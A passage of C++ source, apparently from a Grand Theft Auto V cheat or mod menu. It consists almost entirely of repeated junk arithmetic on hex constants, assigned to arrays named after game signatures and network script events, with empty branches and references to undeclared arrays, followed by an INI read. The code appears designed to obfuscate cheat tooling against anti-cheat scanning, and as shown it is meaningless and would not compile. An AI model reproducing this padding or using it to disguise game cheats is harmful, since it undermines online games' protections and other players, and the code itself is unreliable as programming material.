			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			std::string Modelo = Extern_Reader::INIFile::String::LerString(buffer, "Modelo");
			if (Modelo == "")
			{

				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
